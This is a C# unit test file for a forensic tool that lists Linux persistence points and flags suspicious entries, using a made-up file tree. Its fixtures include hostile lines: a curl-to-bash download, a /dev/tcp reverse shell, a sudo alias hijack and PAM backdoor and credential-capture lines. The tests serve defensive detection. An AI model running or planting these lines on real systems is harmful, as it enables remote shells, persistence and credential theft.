using ArtefactForge.Core.Linux;

namespace ArtefactForge.Tests;

/// <summary>Persistence and tampering points beyond cron and systemd, on a made-up Linux tree.</summary>
public class PersistenceTests
{
    private static void Put(TempDirectory dir, string relative, string text) =>
        File.WriteAllText(dir.File(Path.Combine(["root", .. relative.Split('/')])), text);

    private static (List<Dictionary<string, string>> Locations, List<Dictionary<string, string>> Entries, string Errors) Run(TempDirectory dir)
    {
        var output = Path.Combine(dir.Path, "out");
        using var log = new StringWriter();
        using var errors = new StringWriter();
        Assert.Equal(0, PersistenceExport.Run(Path.Combine(dir.Path, "root"), output, log, errors, CancellationToken.None));
        List<Dictionary<string, string>> Read(string name) =>
            File.Exists(Path.Combine(output, name)) ? CsvReader.Read(Path.Combine(output, name)) : [];
        return (Read("LinuxPersistence_Locations.csv"), Read("LinuxPersistence_Entries.csv"), errors.ToString());
    }

    [Fact]
    public void Every_line_of_preload_and_boot_scripts_is_listed()
    {
        using var dir = new TempDirectory();
        Put(dir, "etc/ld.so.preload", "# comment\n/usr/local/lib/libprocesshider.so\n");
        Put(dir, "etc/rc.local", "#!/bin/sh -e\n/opt/.x/agent &\nexit 0\n");

        var (_, entries, errors) = Run(dir);

        Assert.Equal("", errors);
        var preload = entries.Single(e => e["Path"] == "etc/ld.so.preload");
        Assert.Equal(("2", "/usr/local/lib/libprocesshider.so"), (preload["Line"], preload["Entry"]));
        Assert.Contains("every process", preload["Review"]);
        Assert.Equal("/opt/.x/agent &", Assert.Single(entries, e => e["Path"] == "etc/rc.local")["Entry"]);
    }

    [Fact]
    public void Only_suspicious_lines_of_shell_startup_files_are_listed_but_every_file_is_a_location()
    {
        using var dir = new TempDirectory();
        Put(dir, "etc/profile", "if [ \"$PS1\" ]; then\n  PS1='\\u@\\h:\\w\\$ '\nfi\n");
        Put(dir, "home/alice/.bashrc", "alias ll='ls -l'\nalias sudo='/tmp/.s/sudo'\n");
        Put(dir, "root/.bashrc", "(curl -s http://203.0.113.5/a | bash) >/dev/null 2>&1 &\n");

        var (locations, entries, _) = Run(dir);

        Assert.Equal(3, locations.Count);
        Assert.Equal("", locations.Single(l => l["Path"] == "etc/profile")["Review"]);
        Assert.Equal(2, entries.Count);
        Assert.Contains("redefines a command", entries.Single(e => e["Path"] == "home/alice/.bashrc")["Review"]);
        Assert.Equal("Shell startup (root)", entries.Single(e => e["Path"] == "root/.bashrc")["Mechanism"]);
    }

    [Fact]
    public void Pam_lines_outside_the_standard_set_and_backdoor_patterns_are_listed()
    {
        using var dir = new TempDirectory();
        Put(dir, "etc/pam.d/sshd",
            "@include common-auth\n" +
            "auth sufficient pam_permit.so\n" +
            "auth optional pam_exec.so quiet expose_authtok /usr/local/bin/log.sh\n" +
            "auth required /tmp/pam_x.so\n" +
            "session required pam_loginuid.so\n");

        var (_, entries, _) = Run(dir);

        Assert.Equal(["authentication succeeds for anyone", "runs a program during authentication or session",
                      "module loaded from outside the PAM folders"], entries.Select(e => e["Review"]));
    }

    [Fact]
    public void Sshd_settings_that_weaken_access_are_flagged()
    {
        using var dir = new TempDirectory();
        Put(dir, "etc/ssh/sshd_config",
            "Port 22\nPermitRootLogin yes\nAuthorizedKeysFile .ssh/authorized_keys /var/tmp/.k\nUsePAM yes\n");

        var (_, entries, _) = Run(dir);

        Assert.Equal(["Port 22", "PermitRootLogin yes", "AuthorizedKeysFile .ssh/authorized_keys /var/tmp/.k"],
                     entries.Select(e => e["Entry"]));
        Assert.Equal(["", "root may log in with a password", "keys read from a non-default file"], entries.Select(e => e["Review"]));
    }

    [Fact]
    public void Autostart_motd_udev_and_module_hooks_are_found()
    {
        using var dir = new TempDirectory();
        Put(dir, "home/alice/.config/autostart/update.desktop", "[Desktop Entry]\nExec=/home/alice/.local/bin/upd\n");
        Put(dir, "etc/update-motd.d/99-x", "#!/bin/sh\nnohup bash -c 'bash -i >& /dev/tcp/203.0.113.5/443 0>&1' &\n");
        Put(dir, "etc/udev/rules.d/75-x.rules", "ACTION==\"add\", ENV{MAJOR}==\"1\", RUN+=\"/usr/bin/x\"\n");
        Put(dir, "etc/modprobe.d/x.conf", "blacklist pcspkr\ninstall usb-storage /bin/sh -c '/usr/local/bin/y'\n");
        Put(dir, "etc/modules-load.d/x.conf", "diamorphine\n");

        var (_, entries, _) = Run(dir);

        Assert.Contains(entries, e => e["Mechanism"] == "Autostart (alice)" && e["Entry"] == "Exec=/home/alice/.local/bin/upd");
        Assert.Contains("network", entries.Single(e => e["Path"] == "etc/update-motd.d/99-x")["Review"]);
        Assert.Contains("device event", entries.Single(e => e["Path"] == "etc/udev/rules.d/75-x.rules")["Review"]);
        Assert.Equal("install usb-storage /bin/sh -c '/usr/local/bin/y'", entries.Single(e => e["Path"] == "etc/modprobe.d/x.conf")["Entry"]);
        Assert.Equal("diamorphine", entries.Single(e => e["Path"] == "etc/modules-load.d/x.conf")["Entry"]);
    }
}
